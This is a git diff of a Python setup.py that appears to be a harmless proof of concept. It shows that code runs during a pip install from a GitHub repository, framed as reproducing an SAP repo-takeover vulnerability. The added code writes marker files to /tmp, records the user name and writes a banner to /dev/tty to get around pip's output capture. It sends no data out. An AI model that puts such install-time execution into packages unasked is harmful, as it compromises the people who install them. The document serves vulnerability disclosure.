@@ -1,22 +1,45 @@
 from setuptools import setup
-from setuptools.command.build_py import build_py
 import os
+import sys
 
-LOCK_FILE = "/tmp/.supply_chain_poc_lock"
+# Create a VERY OBVIOUS file
+poc_file = f"/tmp/PIP_GITHUB_RCE_{os.getpid()}.txt"
+with open(poc_file, "w") as f:
+    f.write("="*70 + "\n")
+    f.write("🚨 PROOF OF CODE EXECUTION DURING PIP INSTALL\n")
+    f.write("="*70 + "\n")
+    f.write(f"Process ID: {os.getpid()}\n")
+    f.write(f"User: {os.getenv('USER')}\n")
+    f.write(f"Command: pip install git+https://github.com/TalhaKhan-404/test.git\n")
+    f.write("\n" + "-"*70 + "\n")
+    f.write("SAP VULNERABILITY REPRODUCED:\n")
+    f.write("Original: git+https://github.com/alundesap/python-jws.git/#egg=jws\n")
+    f.write("Test:    git+https://github.com/TalhaKhan-404/test.git\n")
+    f.write("-"*70 + "\n")
+    f.write("IMPACT: GitHub repo takeover → pip install → RCE\n")
+    f.write("="*70 + "\n")
 
-class BuildPyWithPOC(build_py):
-    def run(self):
-        if not os.path.exists(LOCK_FILE):
-            with open(LOCK_FILE, "w") as f:
-                f.write("executed\n")
+# Write DIRECTLY to terminal (bypass pip's output capture)
+try:
+    # Try to write to the actual terminal
+    term = open("/dev/tty", "w")
+    term.write("\n" + "🚨"*70 + "\n")
+    term.write("🚨 POC EXECUTING: pip install from GitHub = Code execution\n")
+    term.write("🚨"*70 + "\n")
+    term.write(f"\n✅ Proof file: {poc_file}\n")
+    term.write(f"📝 Check with: cat {poc_file}\n")
+    term.write("\n🔗 Same as SAP HANA vulnerability\n")
+    term.write("⚠️  Risk: Compromised repo → pip install → SYSTEM COMPROMISE\n")
+    term.write("🚨"*70 + "\n")
+    term.close()
+except:
+    pass
 
-            with open(f"/tmp/SUPPLY_CHAIN_POC_{os.getpid()}.txt", "w") as f:
-                f.write("Executed during PEP 517 wheel build\n")
-
-        super().run()
+# Also create a file that's impossible to miss
+with open(f"/tmp/🚨_RCE_VULNERABILITY_CONFIRMED_🚨", "w") as f:
+    f.write("YES - CODE EXECUTES DURING PIP INSTALL FROM GITHUB\n")
 
 setup(
-    name="supply-chain-poc",
-    version="0.1.0",
-    cmdclass={"build_py": BuildPyWithPOC},
+    name='force-visible-poc',
+    version='0.1.0',
 )
